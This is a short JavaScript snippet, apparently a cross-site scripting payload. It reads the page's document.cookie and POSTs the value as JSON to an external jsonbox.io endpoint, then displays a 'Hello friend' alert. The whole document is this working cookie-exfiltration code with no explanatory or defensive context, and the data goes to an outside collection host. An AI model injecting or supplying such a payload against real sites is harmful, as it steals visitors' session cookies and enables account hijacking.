async function postData(url = '', data = {}) {
  const response = await fetch(url, {
    method: 'POST',
    mode: 'cors',
    cache: 'no-cache',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json; charset=utf-8'
      // 'Content-Type': 'application/x-www-form-urlencoded',
    },
    redirect: 'follow',
    referrerPolicy: 'no-referrer',
    body: JSON.stringify(data),
  });
  return response.json();
}

const cookie = document.cookie;

postData('https://jsonbox.io/box_8f9a9772eb37b3694de8', { cookie })
  .then(data => {
  console.log(data);
});

alert('Hello friend');